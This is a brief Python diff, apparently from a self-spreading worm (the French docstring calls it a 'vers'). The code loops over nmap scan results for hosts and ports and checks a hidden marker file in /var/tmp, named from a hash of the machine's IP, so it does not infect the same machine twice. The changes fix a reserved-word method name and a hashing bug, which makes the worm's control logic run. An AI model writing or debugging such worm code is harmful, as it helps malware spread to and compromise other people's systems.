@@ -32,7 +32,7 @@ class Events():
         self.cibles  = {}
         while self.isStart:
 
-            if not self.continue():
+            if not self._continue():
                 break
             
             for (host, port) in nmap(self):
@@ -54,11 +54,11 @@ class Events():
             
             sleep(5)
 
-    def continue(self):
+    def _continue(self):
         """
         Mets fin au vers si il est déjà présent, pour ce faire vérifie si /var/tmp/.{{ sha256(myip) }} est présent
         """
-        path = f"/var/tmp/.{sha256(getIp()).hexdigest()}"
+        path = f"/var/tmp/.{sha256(getIp().encode()).hexdigest()}"
         if exists(path):
             return False
         else:
